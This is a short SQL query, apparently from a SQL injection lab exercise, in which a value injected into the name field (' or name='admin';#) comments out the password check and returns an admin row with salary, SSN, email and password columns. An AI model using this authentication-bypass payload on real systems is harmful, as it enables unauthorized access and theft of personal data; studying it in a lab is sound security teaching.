SELECT id, name, eid, salary, birth, ssn , address, email, 
      nickname, Password
FROM credential 
WHERE name = '' or name='admin';# and Password='$hashedpwd'";